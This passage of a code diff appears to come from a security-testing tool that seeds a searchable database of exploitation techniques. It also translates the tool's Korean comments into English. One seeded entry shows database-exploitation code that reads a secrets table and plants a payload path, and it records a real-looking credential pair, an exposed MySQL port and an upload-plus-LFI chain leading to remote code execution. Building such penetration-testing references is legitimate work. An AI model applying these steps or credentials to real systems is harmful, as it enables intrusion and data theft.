+                "cur = conn.cursor()\n"
+                "# Read secrets\n"
+                "cur.execute('SELECT * FROM config')\n"
+                "# Modify data for further exploitation\n"
+                "cur.execute(\"UPDATE product SET product_cache=%s WHERE pid=%s\", (payload_path, pid))\n"
+                "conn.commit()"
+            ),
+            "examples": [{
+                "params": {
+                    "db_type": "MySQL",
+                    "credentials_location": "dbutil.py (Python) + upload_action.php (PHP)",
+                    "exposed_port": "23434 → MySQL 3306",
+                    "privileges": "ALL PRIVILEGES on ymp.*",
+                },
+                "notes": (
+                    "docker-compose.yml maps MySQL port 23434:3306 externally. "
+                    "Credentials ymp/H4ppyH4ppyM0n3y found in both Python dbutil.py and PHP sources. "
+                    "Combined with polyglot PNG upload + LFI include for full RCE chain."
+                ),
+            }],
+            "tags": ["credentials", "exposed-db", "mysql", "direct-access", "privilege-escalation", "docker"],
         },
     },
 ]
@@ -1541,7 +1714,7 @@ class Command(BaseCommand):
     def add_arguments(self, parser):
         parser.add_argument(
             "--reset", action="store_true",
-            help="기존 source='technique' 모두 삭제 후 재시드",
+            help="Delete all existing source='technique' entries and re-seed",
         )
 
     @transaction.atomic
@@ -1560,7 +1733,7 @@ class Command(BaseCommand):
                     "vuln_type": t["vuln_type"],
                     "category": t.get("category", "exploitation"),
                     "safety_level": t.get("safety_level", "safe"),
-                    "request_template": "",  # technique은 단일 payload 아님
+                    "request_template": "",  # techniques are not single payloads
                     "matcher": None,
                     "safety_notes": t["attack_metadata"].get("applies_when", "")[:500],
                     "tags": t.get("tags", []),
@@ -1580,13 +1753,13 @@ class Command(BaseCommand):
             f"\ntechniques: +{created_cnt} created, ={updated_cnt} updated"
         ))
 
-        # 임베딩 — search_knowledge / retrieve_similar_patterns 가 hit
+        # Embedding — enables search_knowledge / retrieve_similar_patterns hits
         if embeddings_available():
             from api.embedding_service import pattern_text
             targets = list(PayloadPattern.objects.filter(source="technique"))
             texts = []
             for p in targets:
-                # technique은 attack_metadata 본문이 더 풍부 — 그것 위주로 임베딩
+                # technique attack_metadata body is richer — embed primarily from that
                 meta = p.attack_metadata or {}
                 parts = [
                     f"name: {meta.get('name', p.name)}",
@@ -1608,8 +1781,8 @@ class Command(BaseCommand):
                     f"embeddings saved for {len(vectors)} techniques"
                 ))
             else:
-                self.stdout.write(self.style.WARNING("임베딩 생성 실패 — 건너뜀"))
+                self.stdout.write(self.style.WARNING("Embedding generation failed — skipping"))
         else:
             self.stdout.write(self.style.WARNING(
-                "Voyage 임베딩 비활성: VOYAGE_API_KEY 미설정 — semantic 검색 빈 결과"
+                "Voyage embedding disabled: VOYAGE_API_KEY not set — semantic search returns empty results"
             ))
